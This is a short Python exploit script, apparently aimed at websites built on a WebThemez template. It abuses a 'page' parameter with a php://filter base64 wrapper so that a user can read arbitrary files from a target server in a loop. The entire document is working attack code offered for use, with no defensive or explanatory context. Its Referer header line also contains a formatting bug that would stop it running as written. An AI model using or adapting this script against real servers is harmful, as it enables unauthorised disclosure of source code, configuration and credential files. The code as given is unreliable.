#WebThemez LFI
#Author of code: @l1v1n9h311
#website: procoder.in
import requests
import base64
ip = input("Enter IP of host: ")
while True:
    
    payload=input("Enter file name: ")

    headers = {
        'Host': '{}'.format(ip),
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Referer': 'http://{ip}/index.php?page=home.html'.format(ip),
        # 'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'close',
    }

    response = requests.get(
        'http://{}/index.php?page=php://filter/read=convert.base64-encode/resource={}'.format(ip,payload),
        headers=headers,
        verify=False,
    )
    print(base64.b64decode(response.text).decode())
